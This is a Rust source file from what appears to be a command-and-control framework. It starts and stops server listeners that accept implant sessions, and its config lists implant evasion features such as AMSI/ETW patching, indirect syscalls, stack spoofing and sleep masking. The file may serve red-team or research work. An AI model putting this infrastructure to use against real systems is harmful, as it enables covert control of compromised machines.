// src/server/listeners.rs
//
// Dynamic listener manager. Starts and stops C2 listeners at runtime
// without requiring a server restart. Each listener gets its own accept
// loop on a separate tokio task.

use std::collections::HashMap;
use std::sync::Arc;
use tokio::task::JoinHandle;
use tracing::{info, error};

use crate::common::{SharedSessions, C2Config, TransportProtocol, MalleableProfile};
use crate::transport::ServerTransport;
use crate::database::{self, DbPool, ListenerConfig};
use crate::api::SharedResults;
use crate::server::http_listener::{self, HttpC2State};
use crate::server::session;

/// Runtime state for a single active listener.
struct ActiveListener {
    config: ListenerConfig,
    abort: tokio::task::AbortHandle,
    /// Cancellation token propagated to all session tasks spawned by this
    /// listener. When stop_listener() is called, cancelling this token
    /// signals active sessions to shut down gracefully instead of letting
    /// them run indefinitely as orphaned tasks.
    cancel: tokio_util::sync::CancellationToken,
}

/// Manages all C2 listeners. Shared across the API and server.
pub struct ListenerManager {
    active: HashMap<i64, ActiveListener>,
    db: DbPool,
    sessions: SharedSessions,
    results: SharedResults,
    cert: Vec<u8>,
    key: Vec<u8>,
    ca: Vec<u8>,
}

impl ListenerManager {
    pub fn new(
        db: DbPool,
        sessions: SharedSessions,
        results: SharedResults,
        cert: Vec<u8>,
        key: Vec<u8>,
        ca: Vec<u8>,
    ) -> Self {
        Self { active: HashMap::new(), db, sessions, results, cert, key, ca }
    }

    /// Start all listeners flagged as auto_start in the database.
    pub async fn start_auto(&mut self) {
        let listeners = {
            let conn = match self.db.get() {
                Ok(c) => c,
                Err(e) => { error!("DB error loading listeners: {}", e); return; }
            };
            database::list_listeners(&conn)
        };

        for lc in listeners {
            if lc.auto_start {
                if let Err(e) = self.start_listener(&lc).await {
                    error!(id = lc.id, port = lc.port, error = %e, "Failed to auto-start listener");
                }
            }
        }
    }

    /// Start a specific listener by config.
    pub async fn start_listener(&mut self, lc: &ListenerConfig) -> Result<String, String> {
        if self.active.contains_key(&lc.id) {
            return Err(format!("Listener {} already running", lc.id));
        }

        let transport_proto = match lc.transport.as_str() {
            "tcp_plain" => TransportProtocol::TcpPlain,
            "http" => TransportProtocol::Http,
            "https" => TransportProtocol::Https,
            _ => TransportProtocol::Tls,
        };

        let profile = lc.profile_json.as_ref()
            .and_then(|j| serde_json::from_str::<MalleableProfile>(j).ok())
            .unwrap_or_default();

        let config = C2Config {
            transport: transport_proto.clone(),
            profile,
            proxy: crate::common::ProxyConfig::default(),
            fallback: crate::common::FallbackConfig::default(),
            tunnel_port: lc.port,
            server_public_key: String::new(),
            challenge_key: String::new(),
            hash_salt: String::new(),
            c2_host: String::new(),
            build_id: format!("LISTENER-{}", lc.id),
            sleep_interval: 5,
            jitter_min: 0,
            jitter_max: 0,
            bloat_mb: 0,
            debug: true,
            kill_date: None,
            sni_override: None,
            alpn_protocols: vec![],
            hibernation_mode: false,
            task_batch_size: 10,
            dga: None,
            valid_parents: Vec::new(),
            sleep_mask: "ekko".to_string(),
            indirect_syscalls: true,
            stack_spoof: true,
            patch_amsi_etw: true,
            heap_encrypt: true,
            guard_domain: String::new(),
            guard_hostname: String::new(),
            guard_hour_start: 0,
            guard_hour_end: 0,
            guard_no_system: false,
            auto_pivot_port: None,
        };

        // HTTP(S) listeners use the HTTP C2 server instead of raw TCP
        if transport_proto == TransportProtocol::Http || transport_proto == TransportProtocol::Https {
            return self.start_http_listener(lc, &config).await;
        }

        let transport = ServerTransport::bind(&config, &self.cert, &self.key, &self.ca)
            .await
            .map_err(|e| format!("Bind failed on port {}: {}", lc.port, e))?;

        let transport = Arc::new(transport);
        let sessions = self.sessions.clone();
        let db = self.db.clone();
        let results = self.results.clone();
        let listener_name = lc.name.clone();
        let port = lc.port;
        let cancel_token = tokio_util::sync::CancellationToken::new();
        let task_token = cancel_token.clone();

        let handle: JoinHandle<()> = tokio::spawn(async move {
            info!(port, name = %listener_name, "Listener started");

            let semaphore = Arc::new(tokio::sync::Semaphore::new(256));

            loop {
                tokio::select! {
                    _ = task_token.cancelled() => {
                        info!(port, "Listener cancelled, closing accept loop");
                        break;
                    }
                    accept_result = transport.accept() => {
                        match accept_result {
                            Ok((stream, peer_addr)) => {
                                let s = sessions.clone();
                                let d = db.clone();
                                let r = results.clone();
                                let sem = semaphore.clone();
                                let session_token = task_token.clone();
                                tokio::spawn(async move {
                                    let permit = match tokio::time::timeout(
                                        std::time::Duration::from_secs(30),
                                        sem.acquire_owned()
                                    ).await {
                                        Ok(Ok(p)) => p,
                                        _ => return,
                                    };
                                    // Race between session handler and listener cancellation.
                                    // When stop_listener is called, active sessions are dropped.
                                    tokio::select! {
                                        _ = session::handle_connection(stream, peer_addr, s, d, r, None) => {}
                                        _ = session_token.cancelled() => {}
                                    }
                                    drop(permit);
                                });
                            }
                            Err(e) => {
                                error!(port, error = %e, "Accept error");
                                tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                            }
                        }
                    }
                }
            }
        });

        let abort = handle.abort_handle();
        println!("[+] Listener '{}' started on port {}", lc.name, lc.port);

        self.active.insert(lc.id, ActiveListener {
            config: lc.clone(),
            abort,
            cancel: cancel_token,
        });

        Ok(format!("Listener '{}' started on port {}", lc.name, lc.port))
    }

    /// Stop a running listener by ID.
    pub fn stop_listener(&mut self, id: i64) -> Result<String, String> {
        if let Some(listener) = self.active.remove(&id) {
            // Cancel all active sessions spawned by this listener first,
            // then abort the accept loop. Without the cancel step, active
            // TCP connections continue running as orphaned tokio tasks.
            listener.cancel.cancel();
            listener.abort.abort();
            println!("[-] Listener '{}' stopped (port {})", listener.config.name, listener.config.port);
            Ok(format!("Listener '{}' stopped", listener.config.name))
        } else {
            Err(format!("Listener {} is not running", id))
        }
    }

    /// List currently active listeners with their runtime status.
    pub fn list_active(&self) -> Vec<ListenerStatus> {
        self.active.values().map(|a| ListenerStatus {
            id: a.config.id,
            name: a.config.name.clone(),
            port: a.config.port,
            transport: a.config.transport.clone(),
            running: true,
        }).collect()
    }

    /// Create a new listener in the DB and optionally start it immediately.
    pub async fn create_and_start(
        &mut self,
        name: &str,
        port: u16,
        transport: &str,
        profile_json: Option<&str>,
    ) -> Result<ListenerConfig, String> {
        let id = {
            let conn = self.db.get().map_err(|e| e.to_string())?;
            database::create_listener(&conn, name, port, transport, profile_json)
                .map_err(|e| format!("DB error: {}", e))?
        };

        let lc = {
            let conn = self.db.get().map_err(|e| e.to_string())?;
            database::get_listener(&conn, id).ok_or("Listener not found after insert")?
        };

        self.start_listener(&lc).await?;
        Ok(lc)
    }

    /// Stop and delete a listener.
    pub fn remove(&mut self, id: i64) -> Result<String, String> {
        let _ = self.stop_listener(id);
        let conn = self.db.get().map_err(|e| e.to_string())?;
        if database::delete_listener(&conn, id) {
            Ok(format!("Listener {} removed", id))
        } else {
            Err(format!("Listener {} not found in DB", id))
        }
    }

    /// Start an HTTP(S) C2 listener.
    async fn start_http_listener(&mut self, lc: &ListenerConfig, _config: &C2Config) -> Result<String, String> {
        let http_state = Arc::new(HttpC2State::new(
            self.sessions.clone(),
            self.db.clone(),
            self.results.clone(),
        ));

        let port = lc.port;
        let name = lc.name.clone();
        let use_tls = lc.transport == "https";

        // Create a cancellation token matching the TCP listener pattern so
        // stop_listener() can signal HTTP sessions to shut down gracefully.
        let cancel_token = tokio_util::sync::CancellationToken::new();
        let task_token = cancel_token.clone();

        let handle: JoinHandle<()> = tokio::spawn(async move {
            tokio::select! {
                _ = http_listener::start(http_state, port, use_tls) => {}
                _ = task_token.cancelled() => {
                    info!(port, "HTTP listener cancelled");
                }
            }
        });

        let abort = handle.abort_handle();
        println!("[+] HTTP{} Listener '{}' started on port {}",
            if use_tls { "S" } else { "" }, lc.name, lc.port);

        self.active.insert(lc.id, ActiveListener {
            config: lc.clone(),
            abort,
            cancel: cancel_token,
        });

        Ok(format!("HTTP{} listener '{}' on port {}", if use_tls { "S" } else { "" }, name, port))
    }
}

#[derive(serde::Serialize)]
pub struct ListenerStatus {
    pub id: i64,
    pub name: String,
    pub port: u16,
    pub transport: String,
    pub running: bool,
}
